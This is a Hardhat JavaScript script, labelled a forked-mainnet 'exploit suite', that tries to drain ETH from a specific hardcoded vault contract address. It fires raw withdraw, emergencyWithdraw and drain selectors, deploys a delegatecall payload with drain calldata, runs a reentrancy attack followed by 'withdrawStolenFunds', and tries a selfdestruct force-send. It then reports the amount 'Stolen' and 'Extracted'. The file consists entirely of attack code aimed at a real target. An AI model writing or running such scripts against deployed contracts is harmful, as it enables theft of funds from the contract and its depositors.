const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";

async function main() {
  console.log("\n🎯 ADVANCED EXPLOIT SUITE - FORKED MAINNET TEST");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  console.log("Attacker:", attacker.address);
  
  // Get the target vault
  console.log("\nTarget Vault:", VAULT_ADDRESS);
  
  // Get initial balances
  const vaultBalanceBefore = await ethers.provider.getBalance(VAULT_ADDRESS);
  const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);
  
  console.log("\n📊 INITIAL STATE:");
  console.log("Vault Balance:", ethers.formatEther(vaultBalanceBefore), "ETH");
  console.log("Attacker Balance:", ethers.formatEther(attackerBalanceBefore), "ETH");
  
  const results = [];
  
  // Get current gas price and add buffer
  const feeData = await ethers.provider.getFeeData();
  const gasSettings = {
    maxFeePerGas: feeData.maxFeePerGas * 2n, // Double the suggested fee
    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas * 2n,
    gasLimit: 3000000
  };
  
  // Test 1: Direct withdrawal attempts
  console.log("\n🔧 Testing direct withdrawals...");
  const withdrawFunctions = [
    { selector: "0x3ccfd60b", name: "withdraw()" },
    { selector: "0xdb006a75", name: "emergencyWithdraw()", data: ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [ethers.parseEther("1")]) },
    { selector: "0x9890220b", name: "drain()" }
  ];
  
  for (const func of withdrawFunctions) {
    try {
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: func.data ? func.selector + func.data.slice(2) : func.selector,
        ...gasSettings
      });
      const receipt = await tx.wait();
      console.log(`✅ ${func.name} - Success! Gas used: ${receipt.gasUsed}`);
      results.push({ name: func.name, success: true });
    } catch (error) {
      console.log(`❌ ${func.name} - Failed: ${error.message.slice(0, 50)}...`);
      results.push({ name: func.name, success: false });
    }
  }
  
  // Test 2: Delegatecall exploit - MOST PROMISING
  console.log("\n🎯 Testing delegatecall exploit...");
  try {
    // Deploy malicious contract
    const DelegatecallPayload = await ethers.getContractFactory("DelegatecallPayload");
    const payload = await DelegatecallPayload.deploy(gasSettings);
    await payload.waitForDeployment();
    console.log("Deployed payload at:", await payload.getAddress());
    
    // Try common delegatecall selectors
    const delegateSelectors = [
      "0x5b34b966", // delegatecall(address,bytes)
      "0x61461954", // execute(address,uint256,bytes)
    ];
    
    // Craft malicious calldata to drain funds
    const drainCalldata = payload.interface.encodeFunctionData("drain", [attacker.address]);
    
    for (const selector of delegateSelectors) {
      try {
        let calldata;
        if (selector === "0x5b34b966") { // delegatecall
          calldata = selector + ethers.AbiCoder.defaultAbiCoder().encode(
            ["address", "bytes"],
            [await payload.getAddress(), drainCalldata]
          ).slice(2);
        } else { // execute
          calldata = selector + ethers.AbiCoder.defaultAbiCoder().encode(
            ["address", "uint256", "bytes"],
            [await payload.getAddress(), 0, drainCalldata]
          ).slice(2);
        }
        
        const tx = await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: calldata,
          ...gasSettings
        });
        
        const receipt = await tx.wait();
        console.log(`✅ Delegatecall exploit via ${selector} - Success!`);
        results.push({ name: `Delegatecall-${selector}`, success: true });
        break; // If one works, we're done
      } catch (error) {
        console.log(`❌ Delegatecall ${selector} failed: ${error.message.slice(0, 40)}...`);
      }
    }
  } catch (error) {
    console.log(`❌ Delegatecall setup failed: ${error.message.slice(0, 50)}...`);
    results.push({ name: "Delegatecall", success: false });
  }
  
  // Test 3: Reentrancy attack
  console.log("\n🔄 Deploying reentrancy exploit...");
  try {
    const ReentrancyExploit = await ethers.getContractFactory("ReentrancyExploit");
    const reentrancy = await ReentrancyExploit.deploy(VAULT_ADDRESS, gasSettings);
    await reentrancy.waitForDeployment();
    
    // Use the correct function name from the contract
    const attackTx = await reentrancy.beginAttack({ value: ethers.parseEther("1"), ...gasSettings });
    await attackTx.wait();
    
    console.log("✅ Reentrancy attack executed!");
    
    // Check if we stole anything
    const stolenBalance = await reentrancy.getBalance();
    if (stolenBalance > 0n) {
      console.log(`💰 Stolen: ${ethers.formatEther(stolenBalance)} ETH`);
      const withdrawTx = await reentrancy.withdrawStolenFunds(gasSettings);
      await withdrawTx.wait();
    }
    
    results.push({ name: "Reentrancy", success: true });
  } catch (error) {
    console.log(`❌ Reentrancy failed: ${error.message.slice(0, 50)}...`);
    results.push({ name: "Reentrancy", success: false });
  }
  
  // Test 4: Force-send via selfdestruct
  console.log("\n💣 Testing selfdestruct force-send...");
  try {
    const ForceSend = await ethers.getContractFactory("ForceSend");
    const forceSend = await ForceSend.deploy({ value: ethers.parseEther("1"), ...gasSettings });
    await forceSend.waitForDeployment();
    
    // Use the correct function name from the contract
    const destroyTx = await forceSend.go(VAULT_ADDRESS, gasSettings);
    await destroyTx.wait();
    
    console.log("✅ Force-send via selfdestruct completed!");
    results.push({ name: "Force-send", success: true });
  } catch (error) {
    console.log(`❌ Force-send failed: ${error.message.slice(0, 50)}...`);
    results.push({ name: "Force-send", success: false });
  }
  
  // Check final balances
  const vaultBalanceAfter = await ethers.provider.getBalance(VAULT_ADDRESS);
  const attackerBalanceAfter = await ethers.provider.getBalance(attacker.address);
  
  console.log("\n📊 FINAL RESULTS:");
  console.log("=====================================");
  results.forEach(r => {
    console.log(`${r.success ? '✅' : '❌'} ${r.name} - ${r.success ? 'SUCCESS' : 'FAILED'}`);
  });
  
  console.log("\n💰 BALANCE CHANGES:");
  console.log("Vault Balance Before:", ethers.formatEther(vaultBalanceBefore), "ETH");
  console.log("Vault Balance After:", ethers.formatEther(vaultBalanceAfter), "ETH");
  console.log("Vault Lost:", ethers.formatEther(vaultBalanceBefore - vaultBalanceAfter), "ETH");
  
  const attackerSpent = attackerBalanceBefore - attackerBalanceAfter;
  const vaultLost = vaultBalanceBefore - vaultBalanceAfter;
  console.log("Attacker Gained (net):", ethers.formatEther(vaultLost - attackerSpent), "ETH");
  
  if (vaultLost > 0n) {
    console.log("\n✅ EXPLOIT SUCCESSFUL! Extracted", ethers.formatEther(vaultLost), "ETH from vault!");
  } else {
    console.log("\n❌ No funds extracted from vault");
  }
}

main().catch((error) => {
  console.error("\n💥 Script error:", error);
  process.exit(1);
});
